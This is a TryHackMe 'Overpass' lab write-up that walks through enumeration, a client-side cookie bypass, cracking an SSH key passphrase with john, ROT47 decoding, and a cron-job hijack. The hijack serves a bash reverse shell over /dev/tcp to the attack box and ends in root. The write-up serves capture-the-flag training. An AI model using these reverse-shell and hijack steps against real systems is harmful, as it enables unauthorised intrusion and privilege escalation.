# TryHackMe - Overpass  
🔗 https://tryhackme.com/room/overpass

## 🎯 Objective

Enumerate the web and SSH services, bypass weak client-side authentication, decrypt stored password using ROT47, retrieve SSH private key, crack it using john, and escalate privileges via cron job abuse to achieve root.

---

## 🖥️ Target Information

| Property     | Value                                              |
|--------------|-----------------------------------------------------|
| IP Address   | 10.10.225.77                                        |
| Web Server   | Golang net/http server (possibly Go-IPFS or API)    |
| SSH Server   | OpenSSH 7.6p1 Ubuntu (Port 22)                       |

---

## 🔍 1. Enumeration

### 🔧 Nmap Scan
```bash
nmap -sV -O 10.10.225.77
```

- 22/tcp → OpenSSH 7.6p1
- 80/tcp → Golang net/http server

---

### 🔍 Gobuster Directory Scan
```bash
gobuster dir -u http://10.10.225.77 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u http://10.10.247.215/as -w /usr/share/wordlists/dirb/common.txt -x php
```

Discovered `/admin`, `/downloads`, `/src` folders.

---

## 🔐 2. Client-Side Login Bypass

- `login.js` handles password check on **client side**
- Manually inject cookie named `SessionToken`
- Refresh → Bypass authentication

---

## 🗝️ 3. Private Key Recovery

Found RSA Private Key in web content:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,....

[...cut...]
-----END RSA PRIVATE KEY-----
```

Convert to hash format:
```bash
/opt/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

✅ Cracked password: `james13`

Set permissions:
```bash
chmod 600 id_rsa
```

Login:
```bash
ssh -i id_rsa james@10.10.225.77
```

---

## 📝 4. Password Discovery (.overpass)

View note in home dir:
```bash
cat todo.txt
```

Find encrypted password in `.overpass`:
```
echo ",LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN." | tr '!-~' 'P-~!-O'
```

✅ Decrypted:
```json
[{"name":"m","pass":"saydrawnlyingpicture"}]
```

---

## 🔓 5. Privilege Escalation (cron abuse)

Check crontab:
```bash
cat /etc/crontab
```

Job:
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

💡 `overpass.thm` is hardcoded → hijack via `/etc/hosts`

Redirect domain:
```bash
echo "10.10.95.251 overpass.thm" >> /etc/hosts
```

Create malicious script on attack box:
```bash
echo 'bash -i >& /dev/tcp/10.10.95.251/12345 0>&1' > buildscript.sh
python3 -m http.server 80
```

Listen for root shell:
```bash
nc -lvnp 12345
```

✅ root shell received after 1 minute!

---

## ✅ Summary

| Phase                   | Status                          |
|------------------------|----------------------------------|
| Enumeration             | ✅ Nmap + Gobuster               |
| Login Bypass            | ✅ Cookie injection              |
| RSA Key Crack           | ✅ james / james13               |
| Password Decoding       | ✅ ROT47 + .overpass             |
| Privilege Escalation    | ✅ Crontab + curl hijack         |
| Root Access             | ✅ Obtained via reverse shell    |
